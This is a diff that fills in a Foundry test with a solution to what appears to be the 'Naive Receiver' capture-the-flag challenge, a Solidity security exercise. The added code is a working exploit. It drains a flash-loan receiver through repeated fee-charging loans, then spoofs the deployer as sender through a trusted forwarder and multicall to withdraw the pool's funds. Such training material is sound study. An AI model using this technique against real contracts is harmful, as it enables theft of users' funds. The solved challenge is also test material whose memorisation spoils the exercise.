@@ -77,7 +77,40 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // 1. Drain FlashLoanReceiver
+        //  Make 10 calls to drain the flash loan receiver contract(1 Weth fee 10 times)
+        // The contract making the flashloan and receiving the fees is the same!
+        uint8 numLoans = 11;
+        bytes[] memory data = new bytes[](numLoans);
+        for (uint256 i; i < 10; i++) {
+            data[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+        data[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, data);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            30000000,
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            ));
+
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        require(forwarder.execute(request, signature));
     }
 
     /**
